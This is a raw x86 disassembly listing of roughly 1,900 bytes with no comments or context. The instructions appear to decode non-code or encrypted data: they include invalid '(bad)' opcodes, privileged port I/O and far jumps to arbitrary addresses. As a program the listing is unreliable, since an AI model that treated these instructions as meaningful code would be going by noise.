  407463:	mov    ah,0x68
  407465:	adc    al,0xc6
  407467:	and    eax,0xcffceb8c
  40746c:	pushf  
  40746d:	js     0x407410
  40746f:	fwait
  407470:	push   ebx
  407471:	sbb    esp,DWORD PTR [ebp-0x43]
  407474:	jae    0x4074f3
  407476:	xchg   ebx,eax
  407477:	ret    
  407478:	and    al,0xe
  40747a:	add    ebp,ebx
  40747c:	jle    0x407463
  40747e:	jp     0x407498
  407480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407481:	test   BYTE PTR [ebx+0x69],dh
  407484:	push   ecx
  407485:	mov    ebx,0x243fc070
  40748a:	ficom  DWORD PTR [ecx+0x5b]
  40748d:	inc    esi
  40748e:	jl     0x4074bd
  407490:	sub    al,0xf2
  407492:	push   cs
  407493:	push   esi
  407494:	mov    DWORD PTR [eax+eiz*8],0xacf524fe
  40749b:	jp     0x4074ce
  40749d:	jge    0x40750e
  40749f:	lock test DWORD PTR [edi-0x7a4bb154],esi
  4074a6:	or     eax,0x884d4399
  4074ab:	cwde   
  4074ac:	xchg   DWORD PTR [edi+0x3e8092e4],ecx
  4074b2:	push   edi
  4074b3:	arpl   WORD PTR [ebx+0x5be3d3ef],cx
  4074b9:	das    
  4074ba:	rol    BYTE PTR [ebx],1
  4074bc:	mov    bl,0x2c
  4074be:	clc    
  4074bf:	sahf   
  4074c0:	adc    dl,BYTE PTR [edx+0x4b]
  4074c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074c4:	push   ecx
  4074c5:	xor    eax,0x1aa3152f
  4074ca:	out    dx,al
  4074cb:	sub    al,BYTE PTR [edi+0x5f3db5bb]
  4074d1:	adc    eax,ecx
  4074d3:	pop    ss
  4074d4:	and    eax,0x143dc656
  4074d9:	jge    0x4074f0
  4074db:	add    al,0x13
  4074dd:	mov    ecx,0x85281921
  4074e2:	cmc    
  4074e3:	xchg   esp,eax
  4074e4:	loope  0x4074a6
  4074e6:	or     edx,DWORD PTR [eax]
  4074e8:	mov    bl,BYTE PTR [eax+0x78]
  4074eb:	repnz inc eax
  4074ed:	jne    0x407480
  4074ef:	jmp    0xe61c02f3
  4074f4:	xor    BYTE PTR [edx-0x8f7ffbb],al
  4074fa:	push   es
  4074fb:	mov    BYTE PTR [eax-0x6ce61ce1],0x95
  407502:	and    cl,BYTE PTR [ebx]
  407504:	and    eax,DWORD PTR [edi+0xe]
  407507:	aas    
  407508:	mov    BYTE PTR [ecx-0x2a5e7db9],cl
  40750e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40750f:	adc    BYTE PTR [ecx+0x2f],ch
  407512:	lods   al,BYTE PTR ds:[esi]
  407513:	push   esi
  407514:	jns    0x40749f
  407516:	adc    dl,BYTE PTR [ebp-0x2d]
  407519:	pop    edi
  40751a:	rcr    DWORD PTR [ebp+0x60],1
  40751d:	fwait
  40751e:	pop    esp
  40751f:	push   eax
  407520:	push   edi
  407521:	inc    edi
  407522:	inc    DWORD PTR ds:0xab1ae07c
  407528:	dec    edi
  407529:	jg     0x4074fa
  40752b:	cmp    BYTE PTR ds:0x84d7ad15,dl
  407531:	out    dx,eax
  407532:	mov    ch,0xe2
  407534:	mov    ds:0xb20588f2,eax
  407539:	enter  0x3604,0x83
  40753d:	mov    eax,DWORD PTR [ebx+0x7]
  407540:	adc    BYTE PTR [esi+0x11c9967],0x14
  407547:	gs xchg esp,eax
  407549:	iret   
  40754a:	sub    DWORD PTR [ebx-0x5b],edx
  40754d:	out    dx,al
  40754e:	outs   dx,DWORD PTR ds:[esi]
  40754f:	hlt    
  407550:	push   0x41
  407552:	inc    ecx
  407553:	push   es
  407554:	sub    ebp,esi
  407556:	outs   dx,BYTE PTR ds:[esi]
  407557:	mov    bl,0xc3
  407559:	push   ebx
  40755a:	mov    al,0xb
  40755c:	sti    
  40755d:	jo     0x4074ed
  40755f:	int3   
  407560:	aaa    
  407561:	mov    edx,0x57f736be
  407566:	imul   DWORD PTR [edx]
  407568:	cmp    al,0xb7
  40756a:	adc    edi,DWORD PTR [ecx]
  40756c:	cli    
  40756d:	popf   
  40756e:	jne    0x407583
  407570:	add    DWORD PTR [esi+edi*8-0x39],0xffffff9b
  407575:	sub    bh,BYTE PTR [edi]
  407577:	fisttp QWORD PTR [eax]
  407579:	out    dx,eax
  40757a:	lea    ebp,[edx-0x4a]
  40757d:	jnp    0x4075d4
  40757f:	in     al,dx
  407580:	pop    eax
  407581:	jo     0x4075cf
  407583:	mov    eax,DWORD PTR [edi+0x70]
  407586:	lods   eax,DWORD PTR ds:[esi]
  407587:	push   eax
  407588:	enter  0x2b0e,0x27
  40758c:	clc    
  40758d:	div    DWORD PTR [edi+0x4e]
  407590:	or     cl,bl
  407592:	or     DWORD PTR [eax-0x74d18f2],0xffffffbf
  407599:	cmp    BYTE PTR [esi+0x1a2925f5],cl
  40759f:	pop    ebx
  4075a0:	mov    edx,0xb5c797d2
  4075a5:	jecxz  0x40761e
  4075a7:	test   DWORD PTR [edx-0x7f8c3d71],ebx
  4075ad:	ror    dh,cl
  4075af:	fs jne 0x407572
  4075b2:	inc    ebp
  4075b3:	shr    BYTE PTR [ebp-0x2d],1
  4075b6:	mov    edi,0x80d0e85d
  4075bb:	jmp    0x4075ab
  4075bd:	sar    BYTE PTR [ecx+0x7472efd0],0x61
  4075c4:	sub    DWORD PTR es:[ecx-0x6b7ed78c],edx
  4075cb:	jno    0x407587
  4075cd:	push   ebp
  4075ce:	dec    esp
  4075cf:	xchg   ebp,eax
  4075d0:	mov    esi,eax
  4075d2:	sbb    eax,0x4386d1f8
  4075d7:	clc    
  4075d8:	into   
  4075d9:	xchg   ebp,eax
  4075da:	ret    0x3fc8
  4075dd:	and    eax,0x681d9770
  4075e2:	xlat   BYTE PTR ds:[ebx]
  4075e3:	mov    ah,0xca
  4075e5:	add    bl,BYTE PTR [edx+0x5130489e]
  4075eb:	daa    
  4075ec:	mov    dl,0x26
  4075ee:	pop    edi
  4075ef:	dec    esp
  4075f0:	adc    DWORD PTR [eax+0x3e],edi
  4075f3:	rcl    BYTE PTR [edx],1
  4075f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075f7:	pop    edi
  4075f8:	nop
  4075f9:	out    dx,eax
  4075fa:	(bad)  
  4075fb:	repnz daa 
  4075fd:	xchg   ebx,eax
  4075fe:	sub    al,0xf5
  407600:	sub    edi,edx
  407602:	jl     0x407683
  407604:	test   eax,0x53aa174
  407609:	pop    edi
  40760a:	fcmovne st,st(1)
  40760c:	in     eax,dx
  40760d:	aam    0x1e
  40760f:	mov    esp,ebp
  407611:	pop    edi
  407612:	sbb    DWORD PTR [ecx],esi
  407614:	daa    
  407615:	adc    ebx,DWORD PTR [edx]
  407617:	xchg   esp,eax
  407618:	push   edi
  407619:	or     eax,0x6484429
  40761e:	cwde   
  40761f:	xchg   esi,eax
  407620:	add    BYTE PTR [edx-0x71],bh
  407623:	stc    
  407624:	pop    esp
  407625:	adc    eax,0xfdc824ab
  40762a:	push   esp
  40762b:	fmulp  st(7),st
  40762d:	xor    al,0xf6
  40762f:	mov    esi,DWORD PTR ds:0x9190d98c
  407635:	jg     0x4076a1
  407637:	sbb    DWORD PTR [ebp-0x74],eax
  40763a:	sub    BYTE PTR [ecx-0x5a1a1fcc],dh
  407640:	enter  0x5141,0xda
  407644:	xor    BYTE PTR [ebp+0x3a5031b5],ch
  40764a:	mov    esp,db0
  40764d:	xor    BYTE PTR [ebp+0x165383bb],dl
  407653:	shl    BYTE PTR [ebx+ebp*4-0x66],1
  407657:	inc    ebx
  407658:	xchg   edi,eax
  407659:	cmp    eax,0x9f32ef9e
  40765e:	and    dh,BYTE PTR [esi+edi*1]
  407661:	fs and dh,bl
  407664:	mov    cl,cl
  407666:	out    0xa2,eax
  407668:	clc    
  407669:	mov    edx,DWORD PTR [eax+esi*1+0x5f6b468b]
  407670:	pusha  
  407671:	jb     0x4076e6
  407673:	push   ds
  407674:	jle    0x407607
  407676:	fdivr  DWORD PTR [eax-0x6]
  407679:	mov    ds:0x2f6485e9,al
  40767e:	xchg   esp,eax
  40767f:	mov    esp,0xecea155f
  407684:	xchg   edx,eax
  407685:	sahf   
  407686:	xor    BYTE PTR [eax-0x41],0xd8
  40768a:	scas   al,BYTE PTR es:[edi]
  40768b:	ror    DWORD PTR [esi+0x5a],cl
  40768e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40768f:	in     al,0x53
  407691:	test   eax,0xd8c0eae7
  407696:	mov    ebp,0x4dc33fbc
  40769b:	enter  0xf926,0xdd
  40769f:	inc    ebx
  4076a0:	sub    ebp,ebp
  4076a2:	cmp    eax,0x805ff4e6
  4076a7:	das    
  4076a8:	popa   
  4076a9:	inc    ecx
  4076aa:	bound  ebp,QWORD PTR [esi-0x18e02470]
  4076b0:	jae    0x40768d
  4076b2:	mov    esp,eax
  4076b4:	push   ss
  4076b5:	lods   al,BYTE PTR ds:[esi]
  4076b6:	pop    eax
  4076b7:	loop   0x407643
  4076b9:	lock clc 
  4076bb:	jl     0x4076f2
  4076bd:	es cli 
  4076bf:	pusha  
  4076c0:	not    BYTE PTR [eax]
  4076c2:	jns    0x407680
  4076c4:	repz cli 
  4076c6:	fmul   DWORD PTR [ebp+0xe84bfad]
  4076cc:	or     eax,DWORD PTR [edx+0x21]
  4076cf:	dec    esi
  4076d0:	rcr    cl,1
  4076d2:	or     ecx,DWORD PTR [esi]
  4076d4:	pop    ss
  4076d5:	xor    BYTE PTR [edx],ch
  4076d7:	sub    bh,al
  4076d9:	inc    esp
  4076da:	jg     0x4076b1
  4076dc:	jmp    0x4076f1
  4076de:	pop    esi
  4076df:	lahf   
  4076e0:	xchg   ebp,eax
  4076e1:	xor    DWORD PTR [ebp-0x12],ebx
  4076e4:	(bad)  
  4076e6:	dec    edi
  4076e7:	mov    ecx,0x7871dcfd
  4076ec:	sar    BYTE PTR [esi-0x589e3557],1
  4076f2:	mov    edi,0x658696f4
  4076f7:	cmovg  edi,DWORD PTR [ebx]
  4076fa:	inc    esi
  4076fb:	and    ecx,DWORD PTR [edi-0xa]
  4076fe:	aad    0x36
  407700:	inc    ebp
  407701:	enter  0x955a,0x70
  407705:	das    
  407706:	shl    DWORD PTR [esi],0x9d
  407709:	sbb    al,0xee
  40770b:	pop    edx
  40770c:	dec    ecx
  40770d:	pop    edi
  40770e:	pop    ebx
  40770f:	push   ss
  407710:	js     0x407700
  407712:	dec    ebx
  407713:	mov    eax,ds:0x320ebe6e
  407718:	pop    ecx
  407719:	xlat   BYTE PTR ds:[ebx]
  40771a:	mov    al,0x18
  40771c:	dec    edi
  40771d:	fcmovu st,st(2)
  40771f:	or     DWORD PTR [eax-0x72],esi
  407722:	mov    eax,0xd41b8dfc
  407727:	jns    0x407719
  407729:	in     eax,0x44
  40772b:	test   esi,esi
  40772d:	cmp    DWORD PTR [edi-0x69],eax
  407730:	fisubr DWORD PTR [ecx+ebx*4+0x2d]
  407734:	lods   eax,DWORD PTR ds:[esi]
  407735:	pop    edx
  407736:	(bad)  
  407737:	push   esi
  407738:	stos   DWORD PTR es:[edi],eax
  407739:	ins    BYTE PTR es:[edi],dx
  40773a:	cld    
  40773b:	cmp    eax,0x3230e88b
  407740:	cwde   
  407741:	int    0xf1
  407743:	push   ebp
  407744:	cmp    ecx,DWORD PTR [edx-0x2145c413]
  40774a:	push   ebp
  40774b:	ins    DWORD PTR es:[edi],dx
  40774c:	mov    WORD PTR [ecx],ds
  40774e:	push   0xc4b1286d
  407753:	int    0x99
  407755:	push   edx
  407756:	bound  eax,QWORD PTR [ebx+0x54]
  407759:	jmp    0x9bed11da
  40775e:	loope  0x407743
  407760:	mov    edi,DWORD PTR [eax+0x369216cc]
  407766:	pop    esp
  407767:	adc    BYTE PTR [ecx+0x34],ch
  40776a:	cs sti 
  40776c:	call   0x9bcb:0x52a2a473
  407773:	mov    edi,0x4c9e6814
  407778:	(bad)  
  407779:	sub    cl,al
  40777b:	mov    eax,ds:0xd96de727
  407780:	cmc    
  407781:	lea    esi,[ecx+0x34]
  407784:	ds iret 
  407786:	out    0xe7,eax
  407788:	add    BYTE PTR [ecx-0x77],bh
  40778b:	int3   
  40778c:	fdivr  DWORD PTR [edi+ebp*4+0x2]
  407790:	inc    ecx
  407791:	shl    BYTE PTR [ebx],1
  407793:	add    ebp,DWORD PTR [eax]
  407795:	mov    ecx,ecx
  407797:	mov    dh,0x1e
  407799:	cmc    
  40779a:	xor    DWORD PTR [ebx+0x62],0xffffffe4
  40779e:	data16 jmp 0x4077db
  4077a1:	nop
  4077a2:	push   eax
  4077a3:	or     al,0x9a
  4077a5:	inc    edi
  4077a6:	test   DWORD PTR [eax],esi
  4077a8:	adc    BYTE PTR [ebx-0x36],dl
  4077ab:	out    0x9,al
  4077ad:	out    0xe9,eax
  4077af:	bound  edx,QWORD PTR ds:0x301e2874
  4077b5:	cwde   
  4077b6:	pop    esi
  4077b7:	std    
  4077b8:	xchg   ecx,eax
  4077b9:	test   al,0xaf
  4077bb:	in     al,dx
  4077bc:	and    al,0xee
  4077be:	ss sub al,0xd4
  4077c1:	dec    edi
  4077c2:	cmp    cl,cl
  4077c4:	inc    esi
  4077c5:	pushf  
  4077c6:	push   eax
  4077c7:	mov    ah,0x0
  4077c9:	icebp  
  4077ca:	dec    esp
  4077cb:	stos   DWORD PTR es:[edi],eax
  4077cc:	or     DWORD PTR [eax+edx*2],edi
  4077cf:	lods   al,BYTE PTR ds:[esi]
  4077d0:	inc    ecx
  4077d1:	xchg   ebp,eax
  4077d2:	lea    eax,[eax+0x6]
  4077d5:	or     DWORD PTR [edi-0x7f473f1e],ecx
  4077db:	(bad)  
  4077dc:	push   edx
  4077dd:	jmp    0x53c:0x6ac3209d
  4077e4:	lds    esp,FWORD PTR [ebx]
  4077e6:	cmp    ah,BYTE PTR [ebx-0xb]
  4077e9:	push   si
  4077eb:	inc    ebp
  4077ec:	test   al,0xa7
  4077ee:	xor    eax,0x69a1f50
  4077f3:	inc    ecx
  4077f4:	cmp    eax,0x57eeff4a
  4077f9:	push   cs
  4077fa:	pop    ecx
  4077fb:	loop   0x407836
  4077fd:	sti    
  4077fe:	scas   eax,DWORD PTR es:[edi]
  4077ff:	jnp    0x4077a9
  407801:	cdq    
  407802:	push   ebx
  407803:	cmp    eax,DWORD PTR [edi+edx*1]
  407806:	push   ds
  407807:	es jmp 0x4077d6
  40780a:	dec    eax
  40780b:	mov    ds:0xfc3ceb8,al
  407810:	daa    
  407811:	push   ds
  407812:	push   ebx
  407813:	cmp    edx,DWORD PTR [esi]
  407815:	wrmsr  
  407817:	out    0x65,eax
  407819:	daa    
  40781a:	xchg   DWORD PTR [esi+0x5a],edx
  40781d:	and    eax,0x7059db4b
  407822:	leave  
  407823:	or     esp,DWORD PTR [edx-0x313c3b52]
  407829:	or     BYTE PTR [edi],al
  40782b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40782c:	sub    eax,DWORD PTR [eax+0x7e803d48]
  407832:	neg    DWORD PTR cs:[ebx+0x47]
  407836:	dec    ebp
  407837:	mov    ebx,0x78244fa6
  40783c:	mov    ebp,0x23cd24e0
  407841:	test   al,0xb7
  407843:	mov    WORD PTR [edx+0x6016c5ad],?
  407849:	xor    BYTE PTR [ecx-0x4d],cl
  40784c:	retf   
  40784d:	or     eax,0xc7628cb9
  407852:	pop    ebx
  407853:	das    
  407854:	stc    
  407855:	jle    0x407850
  407857:	push   edx
  407858:	add    esp,esp
  40785a:	es dec eax
  40785c:	call   0x15523fa7
  407861:	and    eax,0xdc7c99e4
  407866:	cmp    DWORD PTR [ecx],0xc34080f
  40786c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40786d:	jns    0x40788a
  40786f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407870:	sti    
  407871:	xchg   DWORD PTR [ebx],ebp
  407873:	mov    ebp,0x19f437b9
  407878:	jmp    FWORD PTR [eax-0x21]
  40787b:	jns    0x40780d
  40787d:	sbb    DWORD PTR [edi],esp
  40787f:	inc    esp
  407880:	test   al,0xee
  407882:	pop    ebx
  407883:	ins    BYTE PTR es:[edi],dx
  407884:	mov    bh,0xd8
  407886:	in     al,dx
  407887:	jne    0x40788b
  407889:	aam    0xd9
  40788b:	hlt    
  40788c:	add    ah,dl
  40788e:	es pop ebp
  407890:	or     eax,0x8378f16b
  407895:	mov    bh,BYTE PTR [ecx]
  407897:	mov    dh,0x1f
  407899:	mov    edi,0x9caf22c3
  40789e:	push   ds
  40789f:	pop    ecx
  4078a0:	addr16 inc eax
  4078a2:	add    eax,DWORD PTR [ebx+0x586c8e9d]
  4078a8:	mov    esi,DWORD PTR [edx]
  4078aa:	dec    ebx
  4078ab:	ins    DWORD PTR es:[edi],dx
  4078ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078ad:	popf   
  4078ae:	inc    ebp
  4078af:	and    al,0xca
  4078b1:	loope  0x407912
  4078b3:	iret   
  4078b4:	fcom   DWORD PTR [esi-0x2c]
  4078b7:	inc    ebx
  4078b8:	mov    edi,0x34e55a43
  4078bd:	lea    ax,[edi+0x69]
  4078c1:	cmp    eax,0xbbe5bf71
  4078c6:	loop   0x407917
  4078c8:	xor    eax,0xf7f74508
  4078cd:	xchg   edx,eax
  4078ce:	scas   eax,DWORD PTR es:[edi]
  4078cf:	test   BYTE PTR [eax-0xed1dd5f],al
  4078d5:	dec    esp
  4078d6:	or     eax,0xbe9bb2f2
  4078db:	inc    esi
  4078dc:	sub    esp,esi
  4078de:	xlat   BYTE PTR ds:[ebx]
  4078df:	xchg   edi,eax
  4078e0:	in     al,0xe0
  4078e2:	cdq    
  4078e3:	fild   WORD PTR [ebp-0x3837cd3a]
  4078e9:	sub    DWORD PTR [edx+0x40f1624f],esp
  4078ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f0:	cmp    eax,0x2dca007a
  4078f5:	pop    esi
  4078f6:	je     0x40794e
  4078f8:	inc    ecx
  4078f9:	std    
  4078fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078fb:	out    0xf9,eax
  4078fd:	fbld   TBYTE PTR [ebx-0x7d]
  407900:	mov    ds:0x90b0898f,al
  407905:	mov    WORD PTR gs:[edi+0x2734117c],cs
  40790c:	mov    ch,0x76
  40790e:	(bad)  
  40790f:	popf   
  407910:	cmp    DWORD PTR [esi+0x41],esp
  407913:	fistp  QWORD PTR [ebp+0x65]
  407916:	dec    ebp
  407917:	pop    ebp
  407918:	mov    DWORD PTR [edi-0x6ad9730b],esp
  40791e:	mov    ebx,DWORD PTR [eax+0x39]
  407921:	xchg   ebx,eax
  407922:	ins    BYTE PTR es:[edi],dx
  407923:	popa   
  407924:	pushf  
  407925:	imul   esi,DWORD PTR [esp+ecx*8+0xd],0xcb78eca8
  40792d:	dec    ecx
  40792e:	addr16 mov ds:0x8247,eax
  407932:	loop   0x407935
  407934:	mov    cl,al
  407936:	addr16 out dx,eax
  407938:	jb     0x40796d
  40793a:	mov    al,ds:0x6c5fd75e
  40793f:	cmp    DWORD PTR [ebp+0x7e178bbe],esi
  407945:	icebp  
  407946:	xor    bh,bl
  407948:	ins    BYTE PTR es:[edi],dx
  407949:	inc    ebp
  40794a:	push   edx
  40794b:	add    ecx,DWORD PTR [ebx-0x369c6912]
  407951:	aaa    
  407952:	inc    edx
  407953:	push   cs
  407954:	and    BYTE PTR [ebp-0x2e],0x47
  407958:	stc    
  407959:	stc    
  40795a:	mov    al,0x80
  40795c:	push   esp
  40795d:	ins    DWORD PTR es:[edi],dx
  40795e:	aas    
  40795f:	pushf  
  407960:	mov    ss,WORD PTR [ecx]
  407962:	push   cs
  407963:	mov    al,ds:0x851572ea
  407968:	lahf   
  407969:	adc    ah,bl
  40796b:	add    ch,bh
  40796d:	sahf   
  40796e:	lock dec eax
  407970:	adc    eax,0xa37bc4
  407975:	jo     0x407980
  407977:	out    dx,al
  407978:	int    0x92
  40797a:	push   esi
  40797b:	push   eax
  40797c:	jb     0x4079e0
  40797e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40797f:	xchg   ecx,eax
  407980:	in     eax,0x24
  407982:	jmp    0x2f5a:0x75080ef9
  407989:	push   ebx
  40798a:	sbb    edi,edx
  40798c:	jmp    0xb739f97d
  407991:	iret   
  407992:	fs dec ebx
  407994:	scas   al,BYTE PTR es:[edi]
  407995:	cdq    
  407996:	push   0x20
  407998:	push   edi
  407999:	mov    gs,WORD PTR [edx]
  40799b:	loope  0x407a1a
  40799d:	pop    edi
  40799e:	dec    esi
  40799f:	pop    edi
  4079a0:	je     0x40798e
  4079a2:	gs fcomp st(6)
  4079a5:	pop    esp
  4079a6:	imul   edi,DWORD PTR [edx-0x77],0x56
  4079aa:	pop    esi
  4079ab:	jge    0x4079e3
  4079ad:	lods   eax,DWORD PTR ds:[esi]
  4079ae:	arpl   WORD PTR [ebx+0x17],di
  4079b1:	ret    
  4079b2:	ja     0x4079a2
  4079b4:	mov    ebp,0x4a013afc
  4079b9:	arpl   WORD PTR [edx],ax
  4079bb:	xor    eax,DWORD PTR [esi-0x6c]
  4079be:	in     al,0x51
  4079c0:	push   es
  4079c1:	outs   dx,BYTE PTR ds:[esi]
  4079c2:	stos   DWORD PTR es:[edi],eax
  4079c3:	leave  
  4079c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079c5:	sub    edx,DWORD PTR [ebx-0x7a]
  4079c8:	push   0x30
  4079ca:	cmc    
  4079cb:	scas   eax,DWORD PTR es:[edi]
  4079cc:	data16 aaa 
  4079ce:	(bad)  
  4079cf:	mov    al,BYTE PTR [ecx+0x6d930996]
  4079d5:	dec    edi
  4079d6:	mov    al,0x28
  4079d8:	and    dl,al
  4079da:	xabort 0x68
  4079dd:	mov    eax,ds:0x1a5869ef
  4079e2:	sbb    DWORD PTR [esi*4-0x10b327e5],ebx
  4079e9:	push   ds
  4079ea:	hlt    
  4079eb:	inc    edx
  4079ec:	adc    BYTE PTR [eax+eax*8-0x44],0x6c
  4079f1:	xchg   ebx,eax
  4079f2:	sar    BYTE PTR [ecx-0x3d24e307],0x7f
  4079f9:	fsub   st(3),st
  4079fb:	pop    ds
  4079fc:	jno    0x4079ee
  4079fe:	pop    esi
  4079ff:	dec    esp
  407a00:	sbb    eax,0x10ab3f6c
  407a05:	loop   0x407a57
  407a07:	leave  
  407a08:	xchg   ebp,eax
  407a09:	cmp    al,BYTE PTR [ebx+0x75bbef0f]
  407a0f:	jbe    0x407a06
  407a11:	push   ebp
  407a12:	xchg   ecx,eax
  407a13:	and    al,0x10
  407a15:	scas   eax,DWORD PTR es:[edi]
  407a16:	push   ds
  407a17:	stc    
  407a18:	jmp    0x1e87020d
  407a1d:	pushf  
  407a1e:	adc    esi,DWORD PTR [ebp+0x11]
  407a21:	or     DWORD PTR [esi-0x1c732719],esi
  407a27:	jmp    0x3fe1be9f
  407a2c:	pusha  
  407a2d:	mov    edx,0xdf26cd6e
  407a32:	ja     0x407a10
  407a34:	jecxz  0x407a6f
  407a36:	in     eax,0x3d
  407a38:	xchg   ecx,eax
  407a39:	adc    dl,ah
  407a3b:	popa   
  407a3c:	outs   dx,BYTE PTR ds:[esi]
  407a3d:	data16 jp 0x407a56
  407a40:	pop    ds
  407a41:	push   edx
  407a42:	(bad)  
  407a43:	fbld   TBYTE PTR [ebx+ebp*4+0x72]
  407a47:	cmp    BYTE PTR [ebx],bh
  407a49:	inc    eax
  407a4a:	xor    eax,0xae9c1c15
  407a4f:	mov    al,0x30
  407a51:	push   es
  407a52:	ins    BYTE PTR es:[edi],dx
  407a53:	jns    0x407a27
  407a55:	fmul   QWORD PTR [ecx]
  407a57:	jae    0x4079ea
  407a59:	xchg   BYTE PTR [esi+eiz*2-0x6],bh
  407a5d:	mov    ebx,0xd8d66829
  407a62:	dec    ebp
  407a63:	adc    BYTE PTR [esi-0x30325f2c],0xe2
  407a6a:	clc    
  407a6b:	jl     0x407a07
  407a6d:	in     al,dx
  407a6e:	sbb    al,0xac
  407a70:	add    BYTE PTR [ebp+0x8e6b9e1],bh
  407a76:	pop    ebx
  407a77:	in     eax,dx
  407a78:	repnz ror BYTE PTR [eax-0x75],cl
  407a7c:	or     DWORD PTR [ecx+0x7f],ebp
  407a7f:	outs   dx,DWORD PTR ds:[esi]
  407a80:	call   0x3e9e57fd
  407a85:	and    eax,0xdada4426
  407a8a:	push   esi
  407a8b:	jle    0x407a1c
  407a8d:	(bad)  
  407a8f:	xchg   esp,eax
  407a90:	or     BYTE PTR ds:0x5b48237a,0x20
  407a97:	aaa    
  407a98:	mov    esp,0xc012abb7
  407a9d:	retf   0xf25
  407aa0:	adc    al,0x7b
  407aa2:	(bad)  [esi]
  407aa4:	xchg   esi,eax
  407aa5:	iret   
  407aa6:	or     al,0x7a
  407aa8:	rcl    DWORD PTR [edx-0x53],1
  407aab:	adc    eax,0xe5498dfa
  407ab0:	pop    esp
  407ab1:	sti    
  407ab2:	imul   esp,DWORD PTR [esi-0x7d0abd51],0x66
  407ab9:	adc    DWORD PTR [eax+0x6fa6d25f],edi
  407abf:	push   ebx
  407ac0:	mov    edi,0x16a36dc1
  407ac5:	je     0x407aa0
  407ac7:	icebp  
  407ac8:	and    eax,0xc1c5091f
  407acd:	cmp    DWORD PTR [eax-0x6d94b1e7],0xffffff8e
  407ad4:	push   edx
  407ad5:	out    0xf,eax
  407ad7:	aad    0x1e
  407ad9:	add    al,0x60
  407adb:	scas   eax,DWORD PTR es:[edi]
  407adc:	fisubr WORD PTR [edx]
  407ade:	test   al,0xe0
  407ae0:	pop    ebx
  407ae1:	test   al,0x58
  407ae3:	dec    ebx
  407ae4:	hlt    
  407ae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ae6:	push   ebp
  407ae7:	mov    cl,0x13
  407ae9:	jmp    0x407ab7
  407aeb:	pop    esp
  407aec:	mov    esi,0xa6d05f8e
  407af1:	or     eax,DWORD PTR [ecx]
  407af3:	xor    al,0x89
  407af5:	dec    ebx
  407af6:	push   ebx
  407af7:	das    
  407af8:	sub    al,0x65
  407afa:	push   ds
  407afb:	(bad)  
  407afc:	les    ebp,FWORD PTR [esi-0x56]
  407aff:	sub    DWORD PTR [eax-0x79],ebp
  407b02:	push   esi
  407b03:	dec    edx
  407b04:	fist   DWORD PTR [eax-0x5d]
  407b07:	and    BYTE PTR [ebx-0xe],al
  407b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b0b:	jl     0x407b2a
  407b0d:	out    dx,eax
  407b0e:	js     0x407b6d
  407b10:	add    al,0xa6
  407b12:	cmc    
  407b13:	xor    DWORD PTR [ecx],esp
  407b15:	addr16 dec edx
  407b17:	retf   
  407b18:	dec    ebx
  407b19:	clc    
  407b1a:	bound  edi,QWORD PTR [esi]
  407b1c:	sub    cl,0x1e
  407b1f:	pop    ebx
  407b20:	mov    ds:0xe67bfebb,eax
  407b25:	jp     0x407b5a
  407b27:	sub    BYTE PTR [edi+0x6e],ch
  407b2a:	jno    0x407b0a
  407b2c:	cld    
  407b2d:	icebp  
  407b2e:	in     eax,dx
  407b2f:	xor    eax,DWORD PTR [esi]
  407b31:	cmp    eax,0x3d63ee0
  407b36:	xchg   ecx,eax
  407b37:	and    eax,0x8b93eea0
  407b3c:	idiv   ah
  407b3e:	popf   
  407b3f:	imul   esi,DWORD PTR [ebx-0x5262a25],0xffffffe4
  407b46:	cld    
  407b47:	mov    ch,0x94
  407b49:	stc    
  407b4a:	out    0x8b,al
  407b4c:	and    BYTE PTR [edx+edx*4],cl
  407b4f:	dec    ebp
  407b50:	fwait
  407b51:	mov    ebx,0xc51a059
  407b56:	(bad)  
  407b57:	int3   
  407b58:	mov    WORD PTR [esi],es
  407b5a:	stc    
  407b5b:	sbb    BYTE PTR [esi],cl
  407b5d:	jo     0x407b08
  407b5f:	pushf  
  407b60:	retf   0x9e49
  407b63:	int    0x34
  407b65:	stc    
  407b66:	call   0xe2cf:0xc1f5f101
  407b6d:	leave  
  407b6e:	mov    ch,0xb4
  407b70:	add    esp,ecx
  407b72:	fmul   DWORD PTR [ecx]
  407b74:	scas   eax,DWORD PTR es:[edi]
  407b75:	adc    al,0xbc
  407b77:	xchg   esp,eax
  407b78:	arpl   WORD PTR [eax-0x443c7792],bp
  407b7e:	dec    ecx
  407b7f:	mov    ecx,0x7801746e
  407b84:	aas    
  407b85:	pushf  
  407b86:	fnstcw WORD PTR [eax+0x40d857ae]
  407b8c:	out    dx,eax
  407b8d:	imul   esp,DWORD PTR [esi],0xec5f5972
  407b93:	or     ebp,DWORD PTR [ecx+0x7b7c2163]
  407b99:	xchg   edi,eax
  407b9a:	cs addr16 and al,0x5e
  407b9e:	add    dh,BYTE PTR [edi+0x8]
  407ba1:	and    cl,0xa
  407ba4:	xchg   ebp,eax
  407ba5:	fiadd  WORD PTR [edx+0x5f264e9]
  407bab:	jo     0x407bd2
  407bad:	xchg   esi,eax
  407bae:	cs call 0x8cf5:0xa8705162
  407bb6:	jns    0x407bf8
  407bb8:	inc    ebx
  407bb9:	std    
  407bba:	lea    ecx,[ebp-0x1f60025f]
  407bc0:	and    DWORD PTR [esi+0x20414920],edi
  407bc6:	scas   eax,DWORD PTR es:[edi]
  407bc7:	mul    BYTE PTR [ecx+0x7cf3cc1a]
  407bcd:	push   ebp
  407bce:	retf   
  407bcf:	fdivr  QWORD PTR [esi-0x4d40ac1f]
  407bd5:	and    al,0x48
  407bd7:	cli    
  407bd8:	sbb    DWORD PTR [ebp+0x1c87ee22],ebx
